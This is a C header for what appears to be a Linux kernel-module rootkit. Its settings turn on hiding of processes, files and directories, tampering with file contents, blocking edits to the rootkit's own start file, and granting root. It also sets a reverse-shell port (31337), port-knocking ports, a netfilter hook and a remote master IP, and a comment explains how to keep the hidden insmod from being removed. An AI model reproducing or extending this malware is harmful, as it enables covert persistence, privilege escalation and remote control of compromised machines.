#ifndef _rk_vars_H_
#define _rk_vars_H_
	/*
	reverse shell port is 31337
	*/
	#define RK_PREFIX "rk_"
	#define CONFIG_NO_WRITE 1
	#define CONFIG_NO_DELETE 1
	//it will be goood if it's contains HIDE_FILE_PREFIX, so that it remain hidden and unmodifiable, but it can be init file that contains your hidden insmod right ? so no write to avoid your module removal on this file editing
	#define CONFIG_RK_NO_WRITE_FILE_PREFIX "rk_start"
	#define CONFIG_RK_NO_DELETE_FILE_PREFIX {"rk_start", "arg1", "arg2"}

	#define CONFIG_HIDE_PROCESS 1

	//#define RK_INSMOD "sudo insmod bds_"
	//#define  RK_START_READ_PREFIX "START READING"
	#define CONFIG_RK_FILE_CONTENT_SUFFIX_TO_HIDE "#</hide>"
	#define CONFIG_RK_FILE_CONTENT_PREFIX_TO_HIDE "#<hide>"

	#define BDS_PORT "31337"
	#define BDS_ROOT_PID "000"
	#define BDS_REVERSE_KNOCKING_PORT "1337"
	#define BDS_BIND_KNOCKING_PORT "1338"

	#define CONFIG_FILE_TAMPERING 1

	#define HIDE_FILE_AND_DIR_PREFIX "rk_start"

	#define CONFIG_HIDE_DIR_AND_FILES 1

	#define CONFIG_NO_OPEN_HIDDEN 1

	#define CONFIG_AUTO_HIDE 1

	#define CONFIG_GIVE_ROOT 1


	#define WRITE_ZERO 2023

	#define ZERO_WRITE 2023

        

	static struct nf_hook_ops *nfho = NULL;
	struct cred *cred;
	char *kpathname;
	char *kfilename;
	static struct work_struct do_umode_exec;
    static struct work_struct do_work_bind;
        
	int err, ret;
	char *MASTER_IP = NULL;
	static char* envp[] =  {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };
	#if LINUX_VERSION_CODE < KERNEL_VERSION(5, 11, 0)
	#define FTRACE_OPS_FL_RECURSION FTRACE_OPS_FL_RECURSION_SAFE
	#endif
	
	
#endif
